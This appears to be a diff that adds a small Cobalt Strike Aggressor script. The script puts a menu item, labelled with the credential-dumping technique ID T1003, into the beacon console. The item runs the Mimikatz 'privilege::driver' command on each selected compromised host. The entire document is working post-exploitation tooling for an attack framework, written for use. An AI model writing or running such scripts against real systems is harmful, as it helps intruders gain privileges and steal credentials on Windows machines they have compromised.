@@ -1,0 +1,13 @@
+# Mimikatz Driver Privilege
+item "Mimikatz - Driver Privilege  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			driver($bid);
+	}
+}
+
+
+#Mimikatz Driver Privilege
+sub driver{
+bmimikatz($1, "privilege::driver");
+}
